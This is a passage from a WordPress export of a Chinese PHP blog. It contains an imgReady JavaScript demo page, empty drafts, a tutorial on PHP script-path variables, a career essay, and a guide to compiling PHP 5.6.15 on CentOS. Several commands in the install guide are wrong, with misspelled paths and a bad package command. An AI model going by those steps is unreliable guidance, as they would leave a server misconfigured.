		imgWrap		= $('imgWrap');
	submit.disabled = false;
	submit.onclick = function () {
		var that = this,
			time = new Timer();
		imgUrl = path.value;
		status.style.display = 'block';
		statusLoad.innerHTML = statusReady.innerHTML = 'Loading...';
		// 参数: 图片地址, 尺寸就绪事件, 完全加载事件, 加载错误事件
		imgReady(imgUrl, function () {
			statusReady.innerHTML = '耗时 ' + (time.stop() / 1000) +' 秒. 宽度: ' + this.width + '; 高度: ' + this.height;
			checkboxFn();
		}, function () {
			statusLoad.innerHTML = '耗时 ' + (time.stop() / 1000) +' 秒. 宽度: ' + this.width + '; 高度: ' + this.height;
		}, function () {
			statusLoad.innerHTML = statusReady.innerHTML = '耗时 ' + (time.stop() / 1000) +' 秒. 加载错误！';
		});
	};
	clsCache.onclick = function () {
		var value = path.value;
		path.value = (value.split('?')[1] ? value.split('?')[0] : value) + '?' + new Date().getTime();
		status.style.display = 'none';
		imgWrap.innerHTML = '';
		return false;
	};
	checkbox.onclick = checkbox.onchange = checkboxFn = function () {
		imgWrap.innerHTML = imgUrl && checkbox.checked ? '<img src="' + imgUrl + '" />' : '';
	};
	checkbox.checked = false;
	$('down').onclick = function () {
		window.open(this.getAttribute('data-href') || this.href);
		return false;
	}
};
// ]]]]><![CDATA[></script>
&nbsp;
<div class="demoInfo">
<h1>imgReady</h1>
<p class="tips">图片头数据加载就绪事件</p>
<strong>下载：</strong>
<a id="down" href="http://www.planeart.cn/demo/imgReady/imgReady.js" data-href="http://goo.gl/KBp5a">imgReady.js</a>
<strong>相关文章：</strong>
<a href="http://www.planeart.cn/?p=1121">再谈javascript图片预加载技术</a>
<strong>演示：</strong>
</div>
<div style="height: 40px; line-height: 40px;"><input id="path" type="text" value="http://www.planeart.cn/demo/imgReady/vistas24.jpg" /> <input id="submit" type="button" value="加 载" /> <label><input id="checkbox" type="checkbox" />显示图片</label>
<a id="clsCache" style="color: #0259c4;" href="#">清空缓存</a><em class="tips">（浏览器会缓存加载过后的图片）</em></div>
<div id="status" style="display: none;">
<strong>通过文件头信息获取尺寸：</strong> <span id="statusReady"></span>
<strong>通过加载完毕后获取尺寸：</strong> <span id="statusLoad"></span>
</div>
<div id="imgWrap"></div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>82</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[imgready]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>草稿在am3:52于2014年9月12日创建</title>
		<link>http://wp.veitor.net/?p=281</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=281</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>281</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[281]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>MySql更新多条数据不建议使用UPDATE语句</title>
		<link>http://wp.veitor.net/?p=358</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=358</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>358</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[358]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>字符编码笔记：ASCII，Unicode和UTF-8</title>
		<link>http://wp.veitor.net/?p=376</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=376</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>376</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[376]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>三角函数复习笔记</title>
		<link>http://wp.veitor.net/?p=497</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=497</guid>
		<description></description>
		<content:encoded><![CDATA[发这篇文章的目的就是为了复习三角函数相关知识，范围应该是从初中到高中的这阶段知识。说起复习的起因，是因为工作中解决问题时遇到的一个困难，需要做一个距离排序功能，那么我就要了解一下关于球面距离计算的方法，涉及到的很多公式都是与三角函数有关的。本文只做积累笔记，不定期更新。如果你也想一起学习，不妨再看一下。
1、弧度制与角度制
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>497</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[497]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>理解Yii事件处理机制</title>
		<link>http://wp.veitor.net/?p=506</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=506</guid>
		<description></description>
		<content:encoded><![CDATA[Yii的事件处理机制是定义在最底层的基类<a href="http://www.php100.com/manual/yii/CComponent.html" target="_blank" rel="noopener noreferrer">Component</a>里的，]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>506</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[506]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>Yiibase类笔记</title>
		<link>http://wp.veitor.net/?p=519</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=519</guid>
		<description></description>
		<content:encoded><![CDATA[该笔记主要记录Yiibase类中的一些变量及方法。虽然平时开发一直用Yii，但有时觉得对有些类中有哪些方法和变量并不是全部了解，所以在此进行一下总结，本篇先从入口文件使用的Yiibase类开始。
先来看一下该类文件中有哪些全局常量：
<strong>YII_BEGIN_TIME</strong>：应用开始执行的时间，也可以看做在index.php中引入yii.php的时间，这是代码执行过程中第一个执行的。所以其值是最早的那个时间点的时间戳（精确到微秒）。
<strong>YII_DEBUG</strong>：布尔值，是否开启调试模式，一般在index.php中定义了。 true时是开启调试状态，不过要注意该状态下运行效率较低，但能提供较多调试信息供查看，上线时记得改回false
<strong>YII_TRACE_LEVEL</strong>：数值，追踪级别设置，主要用于设置记录调试信息的详细程度，数字设置的越大则调试信息越详细。当然要在YII_DEBUG开启时才有意义。
<strong>YII_ENABLE_EXCEPTION_HANDLER：</strong>布尔值，定义了异常处理是否开启，默认开启
<strong>YII_ENABLE_ERROR_HANDLER：</strong>布尔值，定义了错误处理是否开启，默认开启
<strong>YII_PATH：</strong>定义了yii框架所在的目录路径，也即yiibase类所在的文件夹位置
<strong>YII_ZII_PATH：</strong>定义了zii库的目录路径，zii是Yii开发团队开发的一系列的扩展库，或许你可能在各种yii的demo和源码中见到过
Yiibase.php中定义了以上7个全局常量，在Yii项目中的任何地方都可以使用。接下来看Yiibase类中的变量及方法，该类中的所有方法都是静态方法。
<strong>getVersion()：</strong>获取当前Yii框架的版本
<strong>createWebApplication($config=null)：</strong>创建一个网页应用实例。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>519</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[519]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>jquery动态添加的input无法使用serialize提交的问题</title>
		<link>http://wp.veitor.net/?p=525</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=525</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>525</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[525]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>自动草稿</title>
		<link>http://wp.veitor.net/?p=533</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=533</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>533</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[533]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						</item>
					<item>
		<title>centos6.5下安装php5.6.15</title>
		<link>http://wp.veitor.net/?p=534</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=534</guid>
		<description></description>
		<content:encoded><![CDATA[使用的是新浪云主机
首先从php官网获取最新的安装包：http://php.net/get/php-5.6.15.tar.gz/from/a/mirror
&nbsp;
<a href="http://storage.veitor.net/uploads/2015/11/QQ截图20151101132254.jpg"><img class="size-full wp-image-535 aligncenter" alt="QQ截图20151101132254" src="http://storage.veitor.net/uploads/2015/11/QQ截图20151101132254.jpg" width="375" height="212" /></a>
<pre class="lang:sh decode:true">wget http://cn2.php.net/distributions/php-5.6.15.tar.gz
tar -zxvf php-5.6.15.tar.gz
cd php-5.6.15</pre>
下载后，解压，进入解压后的目录
采用源码编译通常直接先./configure
<a href="http://storage.veitor.net/uploads/2015/11/QQ截图20151101133153.jpg"><img class="size-full wp-image-536 aligncenter" alt="QQ截图20151101133153" src="http://storage.veitor.net/uploads/2015/11/QQ截图20151101133153.jpg" width="584" height="160" /></a>
不过由于我使用的是新机器，因此我需要先安装一下gcc，直接<span class="lang:sh decode:true  crayon-inline ">yum install gcc</span>  安装完成。
<pre class="lang:php decode:true">./configure --prefix=/usr/local/php5.6.15</pre>
开始配置，不过配置过程中又报了一个错误。
<a href="http://storage.veitor.net/uploads/2015/11/QQ截图201511011331531.jpg"><img class="aligncenter size-full wp-image-537" alt="QQ截图20151101133153" src="http://storage.veitor.net/uploads/2015/11/QQ截图201511011331531.jpg" width="716" height="99" /></a>这里看似是以为没有安装libxml2，其实需要安装的是libxml2-devel，所以使用<span class="lang:php decode:true  crayon-inline ">gcc libxml2-devel</span> 完成安装后继续./configure
<a href="http://storage.veitor.net/uploads/2015/11/QQ截图201511011331532.jpg"><img class="aligncenter size-full wp-image-538" alt="QQ截图20151101133153" src="http://storage.veitor.net/uploads/2015/11/QQ截图201511011331532.jpg" width="617" height="368" /></a>最后看到这些文字说明已经配置完成了，剩下的就是
<pre class="lang:php decode:true">make &amp;&amp; make install</pre>
一切没问题的话会看到这个
<a href="http://storage.veitor.net/uploads/2015/11/QQ截图201511011331533.jpg"><img class="aligncenter size-full wp-image-540" alt="QQ截图20151101133153" src="http://storage.veitor.net/uploads/2015/11/QQ截图201511011331533.jpg" width="881" height="372" /></a>
&nbsp;
将php.ini配置文件拷贝到安装目录下 <span class="lang:sh decode:true  crayon-inline ">cp php.ini-production /usr/local/php5.6.15/etc/php.ini</span>
再将将拷贝过来的配置文件软链到/etc目录下方便以后随时修改：<span class="lang:sh decode:true  crayon-inline ">ln -s /usr/local/php5.6.15/etc/php.ini /etc/php.ini</span>
将php-fpm.conf配置文件拷贝到安装目录：<span class="lang:php decode:true  crayon-inline ">cp /usr/local/src/php-5.6.15/sapi/fpm/php-fpm.conf.in /user/local/php5.6.15/ext/php-fpm.conf</span> ，再将其软链到/ext目录<span class="lang:php decode:true  crayon-inline ">ln -s /usr/local/php5.6.15/ext/php-fpm.conf /ext/php-fpm.conf</span> ，编辑php-fpm.conf，将pid前的注释分号去掉
将php-fpm拷贝到启动目录<span class="lang:php decode:true  crayon-inline ">cp /usr/local/src/php-5.6.15/sapi/fpm /usr/rc.d/init.d/php-fpm</span> ，并修改执行权限为755，设置开机启动<span class="lang:sh decode:true  crayon-inline ">chkconfig php-fpm on</span>
在php.ini中记得配置时区date.time_zone = PRC;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>534</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[534]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>获取PHP脚本文件路径的几个方法</title>
		<link>http://wp.veitor.net/2014/04/21/%e8%8e%b7%e5%8f%96php%e8%84%9a%e6%9c%ac%e6%96%87%e4%bb%b6%e8%b7%af%e5%be%84%e7%9a%84%e5%87%a0%e4%b8%aa%e6%96%b9%e6%b3%95/</link>
		<pubDate>Mon, 21 Apr 2014 05:23:12 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=39</guid>
		<description></description>
		<content:encoded><![CDATA[别的不扯，直接正题。
在PHP中获得所执行脚本文件路径有以下几个方法：
<ol>
	<li>魔术常量__FILE__：这个魔术常量使用率非常高，经常在定义目录的绝对路径时用dirname(__FILE__)这种形式。另一种绝对路径定义见这篇博文<a title="魔术常量__DIR__和__FILE__的用法区别" href="http://www.veitor.net/article/37.html" target="_blank" rel="noopener noreferrer">《魔术常量__DIR__和__FILE__的用法区别》</a>，但是使用场合与下面两种有区别，使用该常量最终返回的都是包含的文件（这句话的意思就看下面的示例代码吧）。</li>
	<li>使用两个全局变量字符串连接$_SERVER['DOCUMENT_ROOT'] . $SERVER['PHP_SELF']：两个变量拼接而成，前一个变量是获取根目录完整路径，后一个变量是获取从网站根目录到该执行文件的绝对路径。拼接后即是所需要的脚本文件完整路径。</li>
	<li>依然是全局变量$_SERVER['SCRIPT_FILENAME']：这个变量效果和第2种类似</li>
</ol>
示例代码：
index.php文件，存放在e:/project/文件夹下，其中include了同级目录中的test1.php和子目录test中的test2.php
<pre class="show-lang:1 lang:php decode:true" title="index.php">&lt;?php
include './test1.php';
include './test/test2.php';
echo "&lt;br&gt;";
echo __FILE__;
echo "&lt;br&gt;";
echo $_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'];
echo "&lt;br&gt;";
echo $_SERVER['SCRIPT_FILENAME'];
echo "&lt;br&gt;";
?&gt;</pre>
./test.1php和./test/test2.php文件代码相同。
<pre class="lang:php decode:true" title="test1.php和test2.php">&lt;?php
echo "&lt;br&gt;";
echo __FILE__;
echo "&lt;br&gt;";
echo $_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'];
echo "&lt;br&gt;";
echo $_SERVER['SCRIPT_FILENAME'];
echo "&lt;br&gt;";
?&gt;</pre>
接下来看一下结果：
<pre class="lang:php mark:5 decode:true crayon-selected" title="输出结果">E:\project\test1.php
E:/project/index.php
E:/project/index.php
E:\project\test\test2.php
E:/project/index.php
E:/project/index.php
E:\project\index.php
E:/project/index.php
E:/projectt/index.php</pre>
你会发现结果第5行有个不同处，该行就是输出的__FILE__，并且代码是在子目录test中test2.php文件里的。<span style="color: #ff0000;">也就是说明__FILE__写在哪个文件里，输出结果就是显示哪个文件。</span>而其他两个全局变量$_SERVER输出的结果都是最终包含的文件，在这个示例中也就是index.php文件（如果不明白这句话意思，看前面红色的文字，意思就是和它相反的）。
如果对本文有疑问，欢迎留言，一起探讨。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>39</wp:post_id>
		<wp:post_date><![CDATA[2014-04-21 05:23:12]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-21 05:23:12]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%8e%b7%e5%8f%96php%e8%84%9a%e6%9c%ac%e6%96%87%e4%bb%b6%e8%b7%af%e5%be%84%e7%9a%84%e5%87%a0%e4%b8%aa%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>PHP程序员突破成长瓶颈</title>
		<link>http://wp.veitor.net/2014/04/23/php%e7%a8%8b%e5%ba%8f%e5%91%98%e7%aa%81%e7%a0%b4%e6%88%90%e9%95%bf%e7%93%b6%e9%a2%88/</link>
		<pubDate>Wed, 23 Apr 2014 12:37:40 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=59</guid>
		<description></description>
		<content:encoded><![CDATA[先明确我所指的<strong>PHP</strong>工程师，是指毕业工作后，主要以PHP进行WEB系统的开发，没有使用其他语言工作过。工作经验大概在3~4年，普通的WEB系统（百万级访问，千成级数据以内或业务逻辑不是特别复杂）开发起基本得心应手，没有什么问题。但他们会这样的物点：
除了PHP不使用其它的语言,可能会点shell 脚本。
对PHP的掌握不精（很多PHP手册都没有看完,库除外）
知识面比较窄（面对需求，除开使用PHP和mysql ，不知道其它的解决办法）
PHP代码以过程为主，认为面向对象的实现太绕，看不懂
这些PHPer 在遇到需要高性能，处理高并发，大量数据的项目或业务逻辑比较复杂（系统需要解决多领域业务的问题）时，缺少思路。不能分析问题的本质，技术判断力比较差，对于问题较快能找出临时的解决办法，但常常在不断临时性的解决办法中，系统和自己一步步走向崩溃。那怎么提高自己呢？怎么可以挑战难度更高的系统？
<strong>更高的挑战在那里？</strong>
结合我自己的经验，我列出一些具体挑战，让大家先有个感性的认识。
<strong>高性能系统的挑战在哪里？</strong>
如何选择WEB服务器？要不要使用fast-cgi 模式
要不要使用反向代理服务？选择全内存缓存还是硬盘缓存？
是否需要负载均衡？是基于应用层，还是网络层？ 如何保证高可靠性？
你的PHP代码性能如何，使用优化工具后怎么样？ 性能瓶颈在那里？ 是否需要写成C的扩展？
用户访问有什么特点,是读多还是写多？是否需要读写分离？
数据如何存储？写入速度和读出速度如何？ 数据增涨访问速读如何变化？
如何使用缓存？ 怎么样考虑失效？数据的一致性怎么保证？
<strong>高复杂性系统的挑战在哪里？</strong>
能否识别业务所对应的领域？是一个还是多个？
能否合理对业务进行抽象，在业务规则变化能以很小的代价实现？
数据的一致性、安全性可否保证？
是否撑握了面向对象的分析和设计的方法
当我所列出的问题，你都能肯定的回答，我想在技术上你基本已经可能成为架构师了。如何你还不能回答，你需要在以下几个方向加强。
<strong>怎么样提高，突破瓶颈</strong>
如何你还不能回答，你需要在以下几个方向加强：
分析你所使用的技术其原理和背后运行的机制，这样可以提高你的技术判断力，提高你技术方案选择的正确性;
学习大学期间重要的知识, 操作系统原理，数据结构和算法。知道你以前学习都是为了考试，但现在你需要为自己学习，让自己知其所以然。
重新开始学习C语言，虽然你在大学已经学过。这不仅是因为你可能需要写PHP扩展，而且还因为，在做C的应用中，有一个时刻关心性能、内存控制、变量生命周期、数据结构和算法的环境。
学习面向对象的分析与设计，它是解决复杂问题的有效的方法。学习抽象，它是解决复杂问题的唯一之道。
“这么多的东西怎么学，这得学多久呀” ？
如果你努力的话，有较好的规划，估计需要1~2年的时间，怎么学习的问题，我们后续再谈。
（注：下面是原文作者左文建分享的学习方法）
<strong>学习建议</strong>
如何有效的学习是一个大问题。 自己有些实践但很零散，不好总结。昨天晚上睡觉前，突然想到了RUP的核心，“以架构为中心，用例驱动，迭代开发”，借用这个思想，关于有效的学习的方法，可以这样来表述:
以原理、模型或机制为中心，任务驱动，迭代学习
有点抽象， 举个例子来说明如何学习。
目的： 学习如何提高处理性能。
可迭代驱动的任务： 通过IP找到所在地域。
这是WEB应用常见的任务，IP数据库是10左右万行的记录。
<strong>第一次迭代： 不考虑性能的情况下实现功能（通过PHP来实现）</strong>
因为无法直接通过KEY(IP)进行查找地域，所以直接放到数据或通过关联数组这种简单的方法都是不行的。思路还是先把数据进行排序，然后再进行查找
1. 如何通过IP查找？ 已序的数据，二分查找是最快的。
2. 如何排序？用库函数sort当然 是可以，但是即然是学习，那还是自己实现快速排序吧。
学习目标： 排序算法，查找算法
PHPer 数据结构和算法基础比较差，平时也没有这方面的任务，自己也不学习，因此这方面的知识很缺乏。但是，编程解决的问题，最终都会归结到数据结构和对这种数据结构操作的算法。如果数据结构算法常在心中，那遇到问题就能清晰认识到它内在的结构，解决方法就会自然产生。
<strong>第二次迭代：优化数据的加载与排序</strong>
如果做到第一步，那基本上还是不可用，因为数据每次都需要的加载和排序，这样太耗时间。 解决的思路是，数据一次加载排序后，放到每个PHP进程能访问到的地方。
放到memcache 这是大家容易想到问题。其实放到共享内存(EA等加速器都支持)中是更快的方式，因为memcache还多了网络操作。 数据是整体放入到共享内存，还是分块放入，如何测试性能? 如何分析瓶颈所在(xdebug)? 在这些问题的驱动下你会学习到
学习目标： 检测、定位、优化PHP性能的方法; PHP实现结构对性能的影响。
<strong>第三次迭代： 编写PHP的扩展</strong>
性能还是上不去，不得不进入C/C++的世界了，不过从此你将不只是PHPer 而服务端的全能型工程师，当然这对没有做过C/C++的同学挑战是巨大的。 我这里无法再简单来说如何学习C/C++ ，可以参看 《PHP程序员学习C++》
学习目标：C/C++的学习，PHP扩展的编写
怎么确定需要学习的机制和原理呢？ 怎么找到驱动学习任务呢？
我对需要学习的东西，都没有什么概念，怎么回答以上的两个问题？
从这个技术的定位来找出需要学习的重点，即它怎么做到(机制）的和它为什么能这样做到 （模型或原理）
列出这个技术最常见的应用，做为学习的任务，从简到难进行实践。
假如我需要学习Javascript ，我对于HTML，CSS有点感性认识
首要我了解到，JS 是WEB领域的动态语言，主要解决网页的动态交互的。
那我要学习的要点如下：
JS如何与HTML 进行交互 （机制）
JS的动态特性在那里，与其它动态语言有何区别？（语言模型）
如果完全自学，找到需要学习的要点（机制、模型、原理） 设定学习任务的确不是那么容易把握。如果找到一个有经验的人来指导你或加一个学习型的团队，那学习的速度的确会大大提高。
最后，我想说的是： PHP因为简单而使用，但不能因为它的简单而限制我们成长！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>59</wp:post_id>
		<wp:post_date><![CDATA[2014-04-23 12:37:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-23 12:37:40]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e7%a8%8b%e5%ba%8f%e5%91%98%e7%aa%81%e7%a0%b4%e6%88%90%e9%95%bf%e7%93%b6%e9%a2%88]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>概念解释：集群与分布式的区别</title>
		<link>http://wp.veitor.net/2014/04/27/%e6%a6%82%e5%bf%b5%e8%a7%a3%e9%87%8a-%e9%9b%86%e7%be%a4%e4%b8%8e%e5%88%86%e5%b8%83%e5%bc%8f%e7%9a%84%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Sun, 27 Apr 2014 13:50:11 +0000</pubDate>
